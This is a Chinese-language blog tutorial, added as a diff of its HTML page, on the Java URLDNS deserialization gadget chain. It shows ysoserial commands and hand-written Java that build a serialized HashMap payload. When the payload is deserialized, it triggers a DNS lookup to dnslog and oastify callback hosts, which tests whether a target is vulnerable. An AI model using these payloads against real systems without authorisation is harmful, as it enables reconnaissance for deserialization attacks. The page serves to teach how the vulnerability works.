@@ -1,0 +1,842 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="Dre4m">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="JAVA安全之URLDNS链一个对于新手非常友好的链子，不是很复杂 12345*   Gadget Chain:*     HashMap.readObject()*       HashMap.putVal()*         HashMap.hash()*           URL.hashCode()  利用效果是发起一次远程请求，而不能去执行命令。基本上是用来测试是否存在反序列化漏洞的">
+<meta property="og:type" content="article">
+<meta property="og:title" content="JAVA安全之URLDNS链">
+<meta property="og:url" content="http://example.com/post/java-secure-urldns-link-z2cryuz.html">
+<meta property="og:site_name" content="Dre4m">
+<meta property="og:description" content="JAVA安全之URLDNS链一个对于新手非常友好的链子，不是很复杂 12345*   Gadget Chain:*     HashMap.readObject()*       HashMap.putVal()*         HashMap.hash()*           URL.hashCode()  利用效果是发起一次远程请求，而不能去执行命令。基本上是用来测试是否存在反序列化漏洞的">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://raw.githubusercontent.com/Dre4m017/Pic/main/Pic/image-20250730154407-85wbetu.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Dre4m017/Pic/main/Pic/image-20250730154817-mfncdxf.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Dre4m017/Pic/main/Pic/image-20250730163715-2ssh66d.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Dre4m017/Pic/main/Pic/image-20250730165739-hxrt81f.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Dre4m017/Pic/main/Pic/image-20250730165714-bzr6if2.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Dre4m017/Pic/main/Pic/image-20250730165901-gc1a4kh.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Dre4m017/Pic/main/Pic/image-20250731130141-soeedv0.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Dre4m017/Pic/main/Pic/image-20250731130507-9vrg3z1.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Dre4m017/Pic/main/Pic/image-20250731130651-8dg86vw.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Dre4m017/Pic/main/Pic/image-20250731132716-hqywy9b.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Dre4m017/Pic/main/Pic/image-20250731131225-pf0fs73.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Dre4m017/Pic/main/Pic/image-20250731131248-m309bes.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Dre4m017/Pic/main/Pic/image-20250731131326-ie2h9er.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Dre4m017/Pic/main/Pic/image-20250731131629-a9a33vq.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Dre4m017/Pic/main/Pic/image-20250731141529-9hw0b5u.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Dre4m017/Pic/main/Pic/image-20250731142154-u8d2mmn.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Dre4m017/Pic/main/Pic/image-20250731162209-z2wv83b.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Dre4m017/Pic/main/Pic/image-20250731171737-702jc3u.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Dre4m017/Pic/main/Pic/image-20250731202423-ok14olj.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Dre4m017/Pic/main/Pic/image-20250731202638-ce3cexd.png">
+<meta property="article:published_time" content="2025-07-30T15:03:03.000Z">
+<meta property="article:modified_time" content="2025-07-31T20:39:22.000Z">
+<meta property="article:author" content="Dre4m">
+<meta property="article:tag" content="Java安全">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/Dre4m017/Pic/main/Pic/image-20250730154407-85wbetu.png">
+  
+  
+  
+    <meta name="google-site-verification" content="gUNvx5GJIg9_H74I7HHir--7_INvPGWDD52oHPg_-4k" />
+  
+  <title>JAVA安全之URLDNS链 - Dre4m</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":"vklZyGJHIw3vHy3PTGM92QOy-gzGzoHsz","app_key":"uiPwluTg2cOzOaF4R6Ljpxw4","server_url":"https://vklzygjh.lc-cn-n1-shared.com","path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+  
+
+
+
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Dre4mの摸鱼日记</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="JAVA安全之URLDNS链"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2025-07-30 15:03" pubdate>
+          2025年7月30日 下午
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          1.9k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          16 分钟
+        
+      </span>
+    
+
+    
+    
+      
+        <span id="leancloud-page-views-container" class="post-meta" style="display: none">
+          <i class="iconfont icon-eye" aria-hidden="true"></i>
+          <span id="leancloud-page-views"></span> 次
+        </span>
+        
+      
+      
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">JAVA安全之URLDNS链</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="JAVA安全之URLDNS链"><a href="#JAVA安全之URLDNS链" class="headerlink" title="JAVA安全之URLDNS链"></a>JAVA安全之URLDNS链</h1><p>一个对于新手非常友好的链子，不是很复杂</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java">*   Gadget Chain:<br>*     HashMap.readObject()<br>*       HashMap.putVal()<br>*         HashMap.hash()<br>*           URL.hashCode()<br></code></pre></td></tr></table></figure>
+
+<p>利用效果是发起一次远程请求，而不能去执行命令。基本上是用来测试是否存在反序列化漏洞的一个链，比如在一些无法回显执行命令的时候，可以通过URLDNS链去发送一个dns解析请求，如果dnslog收到了请求，就证明了存在漏洞。</p>
+<h1 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h1><h2 id="Java反序列化"><a href="#Java反序列化" class="headerlink" title="Java反序列化"></a>Java反序列化</h2><p>先简单了解一下概念</p>
+<p>Java提供了一种对象序列化的机制，用一个字节序列表示一个对象，该字节包含对象的数据、对象的类型、对象的存储属性。字节序列写出到文件后，相当于可以持久报错了一个对象信息，这过程叫做序列化。序列化对象会通过<code>ObjectOutputStream</code>​的<code>writeObject</code>​方法将一个对象写入到文件中。</p>
+<p>而反序列化是使用了<code>readObject</code>​ 方法进行读取并还原成在序列化前的一个类。</p>
+<p>这一步骤并没有什么安全问题，但是如果反序列化的数据是可控的情况下，那么我们就可以从某个输入点，输入恶意代码，再去查找在哪个点，我们的输入会被一层一层的带去到我们的触发点去，而这一步叫做寻找利用链的步骤。</p>
+<p>可以反序列化必须满足以下几个条件：</p>
+<p>1.类必须实现 <code>java.io.Serializable</code>​ 接口（最基本）</p>
+<p>2.需要存在一个可利用的类，其readObject()方法或其他方法中存在可被利用的逻辑，例如执行命令、读取文件等</p>
+<p>3.序列化和反序列化的类需要具有相同的serialVersionUID</p>
+<h2 id="Java反射"><a href="#Java反射" class="headerlink" title="Java反射"></a>Java反射</h2><p>首先来说一下正射<br>我们在编写代码时，当需要使用到某一个类的时候，都会先了解这个类是做什么的。然后实例化这个类，接着用实例化好的对象进行操作，这就是正射。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Student</span> <span class="hljs-variable">student</span> <span class="hljs-operator">=</span><span class="hljs-keyword">new</span> <span class="hljs-title class_">Student</span>();<br>student.doHomework(<span class="hljs-string">&quot;数学&quot;</span>）;<br></code></pre></td></tr></table></figure>
+
+<p>反射<br>反射就是，一开始并不知道我们要初始化的类对象是什么，自然也无法使用new关键字来创建对象了。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Class</span> <span class="hljs-variable">clazz</span> <span class="hljs-operator">=</span>Class.forName(<span class="hljs-string">&quot;reflection.Student&quot;</span>);<br><span class="hljs-type">Method</span> <span class="hljs-variable">method</span> <span class="hljs-operator">=</span>clazz.getMethod(<span class="hljs-string">&quot;doHomework&quot;</span>，String.class); Constructor constructor=clazz.getConstructor();<br>Object object=constructor.newInstance(); method.invoke(object，“语文<span class="hljs-string">&quot;);</span><br></code></pre></td></tr></table></figure>
+
+<p>反射的作用：让java具有动态性；修改已有对象的属性；动态生成对象；动态调用方法；操作内部类和私有方法</p>
+<p>在反序列化漏洞中的应用：定制需要的对象；通过invoke调用除了同名函数以外的函数；通过Class类创建对象，引入不能序列化的类</p>
+<p>具体的讲解就不过多赘述了，可以参考一下</p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/erosion2020/p/18559481">https://www.cnblogs.com/erosion2020/p/18559481</a></p>
+<h1 id="URLDNS链利用"><a href="#URLDNS链利用" class="headerlink" title="URLDNS链利用"></a>URLDNS链利用</h1><p>ysoserial项目地址：<a target="_blank" rel="noopener" href="https://github.com/frohoff/ysoserial">ysoserial</a></p>
+<p><em>jdk版本低于9，并且windows自带的防火请实时保护要关闭</em></p>
+<p>拉取项目源码，导入到IDEA中。</p>
+<p>看到pom.xml知道该项目是个maven的项目，点击pom.xml 进行刷新，将缺少的依赖给下载下来</p>
+<p><img src="https://raw.githubusercontent.com/Dre4m017/Pic/main/Pic/image-20250730154407-85wbetu.png" srcset="/img/loading.gif" lazyload alt="image"></p>
+<p>拉取完后有红的部分也不会影响正常运行</p>
+<p><img src="https://raw.githubusercontent.com/Dre4m017/Pic/main/Pic/image-20250730154817-mfncdxf.png" srcset="/img/loading.gif" lazyload alt="image"></p>
+<p>将生成的序列化payload保存，后面用一个测试demo读取文件数据再给他反序列化一下，观察dnslog请求就可以了。</p>
+<p>这里要用项目生成的.jar文件</p>
+<p><img src="https://raw.githubusercontent.com/Dre4m017/Pic/main/Pic/image-20250730163715-2ssh66d.png" srcset="/img/loading.gif" lazyload alt="image"></p>
+<p>​<code>java -jar target\ysoserial-0.0.6-SNAPSHOT-all.jar URLDNS &quot;http://sb9p8h.dnslog.cn&quot;</code>​</p>
+<p>​<code>java -jar target\ysoserial-0.0.6-SNAPSHOT-all.jar URLDNS &quot;http://sb9p8h.dnslog.cn&quot; &gt; D:\test\abc.ser</code>​</p>
+<p><img src="https://raw.githubusercontent.com/Dre4m017/Pic/main/Pic/image-20250730165739-hxrt81f.png" srcset="/img/loading.gif" lazyload alt="image"></p>
+<p>反序列化测试demo</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.io.FileInputStream;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.io.ObjectInputStream;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">unserialize</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>        <span class="hljs-comment">// 反序列化的类</span><br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>((<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(<span class="hljs-string">&quot;D:/test/abc.ser&quot;</span>)));<br>        <span class="hljs-comment">// 读出来并反序列化</span><br>        ois.readObject();<br>        ois.close();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>‍</p>
+<p><img src="https://raw.githubusercontent.com/Dre4m017/Pic/main/Pic/image-20250730165714-bzr6if2.png" srcset="/img/loading.gif" lazyload alt="image"></p>
+<p>返回dnslog.cn点击refresh record</p>
+<p><img src="https://raw.githubusercontent.com/Dre4m017/Pic/main/Pic/image-20250730165901-gc1a4kh.png" srcset="/img/loading.gif" lazyload alt="image"></p>
+<h1 id="URLDNS链分析"><a href="#URLDNS链分析" class="headerlink" title="URLDNS链分析"></a>URLDNS链分析</h1><p>HashMap结合URL触发DNS检查的思路。在实际过程中可以首先通过这个去判断服务器是否使用了readObject()以及能否执行。之后再用各种gadget去尝试试RCE。<br>HashMap最早出现在JDK1.2中，底层基于散列算法实现。而正是因为在HashMap中，Entry的存放位置是根据Key的Hash值来计算，然后存放到数组中的。所以对于同一个Key，在不同的JVM实现中计算得出的Hash值可能是不同的。因此，HashMap实现了自己的 writeObject和readObject方法。<br>因为是研究反序列化问题，所以我们来看一下它的readObject方法</p>
+<p><img src="https://raw.githubusercontent.com/Dre4m017/Pic/main/Pic/image-20250731130141-soeedv0.png" srcset="/img/loading.gif" lazyload alt="image"></p>
+<p><img src="https://raw.githubusercontent.com/Dre4m017/Pic/main/Pic/image-20250731130507-9vrg3z1.png" srcset="/img/loading.gif" lazyload alt="image"></p>
+<p>然后再跟进一下hash函数</p>
+<p><img src="https://raw.githubusercontent.com/Dre4m017/Pic/main/Pic/image-20250731130651-8dg86vw.png" srcset="/img/loading.gif" lazyload alt="image"></p>
+<p>这里传入了一个对象，当对象不为空时，调用hashCode</p>
+<p>URL实现了序列化接口</p>
+<p><img src="https://raw.githubusercontent.com/Dre4m017/Pic/main/Pic/image-20250731132716-hqywy9b.png" srcset="/img/loading.gif" lazyload alt="image"></p>
+<p>看一眼URL的hashCode是什么逻辑</p>
+<p><img src="https://raw.githubusercontent.com/Dre4m017/Pic/main/Pic/image-20250731131225-pf0fs73.png" srcset="/img/loading.gif" lazyload alt="image"></p>
+<p><img src="https://raw.githubusercontent.com/Dre4m017/Pic/main/Pic/image-20250731131248-m309bes.png" srcset="/img/loading.gif" lazyload alt="image"></p>
+<p><img src="https://raw.githubusercontent.com/Dre4m017/Pic/main/Pic/image-20250731131326-ie2h9er.png" srcset="/img/loading.gif" lazyload alt="image"></p>
+<p>这里的hashCode默认为就是-1，所以就会正常往下走，会调用handler的hashCode方法，点进去看一下</p>
+<p><img src="https://raw.githubusercontent.com/Dre4m017/Pic/main/Pic/image-20250731131629-a9a33vq.png" srcset="/img/loading.gif" lazyload alt="image"></p>
+<p>这里对传进来的做了一个处理，顾名思义就是根据域名来获取地址也就是域名解析的意思</p>
+<p>也就是说如果我们调用了URL内的hashCode函数，我们就可以得到一个DNS请求</p>
+<p>总结一下这个整体思路：</p>
+<p>hashmap-&gt;readObject-&gt;hash-URL.hashcode-&gt;getHostAddress-&gt;InetAddress.getByName(host);</p>
+<h1 id="亲手构造"><a href="#亲手构造" class="headerlink" title="亲手构造"></a>亲手构造</h1><p>分析完这个链子，我们自己手搓一个</p>
+<p>首先要明确<code>HashMap.readObject()</code>​ 在反序列化时会对键值对进行 <code>put()</code>​ 操作，<code>put()</code>​ 会调用 key 的 <code>hashCode()</code>​，如果 key 是 <code>java.net.URL</code>​，就会触发其 DNS 解析行为，所以我们构造一个 <code>HashMap&lt;URL, String&gt;</code>​，并通过反射让 <code>URL.hashCode()</code>​ 在反序列化时第一次被调用</p>
+<p>先写了一份序列化的demo</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.net.URL;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">UnserializeTest</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;ser.bin&quot;</span>));<br>        oos.writeObject(obj);<br>        oos.close();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        HashMap&lt;URL,Integer&gt; hashMap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;URL, Integer&gt;();<br>        hashMap.put(<span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>(<span class="hljs-string">&quot;http://jd059pldcd9un4aoffkrsnxldcj37uvj.oastify.com&quot;</span>),<span class="hljs-number">1</span>);<br>        serialize(hashMap);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>按理来说什么也不会发生，但是可以看到，序列化的时候就已经接收到请求了</p>
+<p><img src="https://raw.githubusercontent.com/Dre4m017/Pic/main/Pic/image-20250731141529-9hw0b5u.png" srcset="/img/loading.gif" lazyload alt="image"></p>
+<p>反而反序列化收不到了，那这是什么情况呢</p>
+<p> 我们跟到hashmap的put函数里面</p>
+<p><img src="https://raw.githubusercontent.com/Dre4m017/Pic/main/Pic/image-20250731142154-u8d2mmn.png" srcset="/img/loading.gif" lazyload alt="image"></p>
+<p>这里为了确保键的唯一，就已经调用hash方法也就调用了hashcode</p>
+<p>序列化调用hashcode之后就已经改变了，已经是url的hashcode，在反序列化的时候就不会执行后面了</p>
+<p>那么该怎么改进才能避免这种情况呢</p>
+<p>第一点，我们在序列化之前不要发起请求</p>
+<p>第二点，我们要put之后把hashcode改回-1</p>
+<p>所以我们要用java的反射来改变已有对象属性</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.net.URL;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">UnserializeTest</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;ser.bin&quot;</span>));<br>        oos.writeObject(obj);<br>        oos.close();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        HashMap&lt;URL,Integer&gt; hashMap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;URL, Integer&gt;();<br>        <span class="hljs-comment">//把url的hashcode改为不是-1</span><br>        <span class="hljs-type">URL</span> <span class="hljs-variable">url</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>(<span class="hljs-string">&quot;http://gyi2um6axaur81vl0c5odkiiy940stgi.oastify.com&quot;</span>);<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> url.getClass();<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">hashcodefield</span> <span class="hljs-operator">=</span> c.getDeclaredField(<span class="hljs-string">&quot;hashCode&quot;</span>);<br>        hashcodefield.setAccessible(<span class="hljs-literal">true</span>);<br>        hashcodefield.set(url,<span class="hljs-number">1111</span>);<br>        hashMap.put(url,<span class="hljs-number">1</span>);<br>        <span class="hljs-comment">//将hashcode改为-1</span><br>        hashcodefield.set(url,-<span class="hljs-number">1</span>);<br>        serialize(hashMap);<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure>
+
+<p>再执行一下</p>
+<p><img src="https://raw.githubusercontent.com/Dre4m017/Pic/main/Pic/image-20250731162209-z2wv83b.png" srcset="/img/loading.gif" lazyload alt="image"></p>
+<p>这个时候序列化就查询不到了</p>
+<p>再反序列化一下</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> ysoserial.test;<br><br><span class="hljs-keyword">import</span> java.io.FileInputStream;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.io.ObjectInputStream;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">UnserializeTest</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">unserialize</span><span class="hljs-params">(String filename)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(filename));<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> ois.readObject();<br>        <span class="hljs-keyword">return</span> obj;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        unserialize(<span class="hljs-string">&quot;ser.bin&quot;</span>);<br>    &#125;<br>&#125;<br><br><br></code></pre></td></tr></table></figure>
+
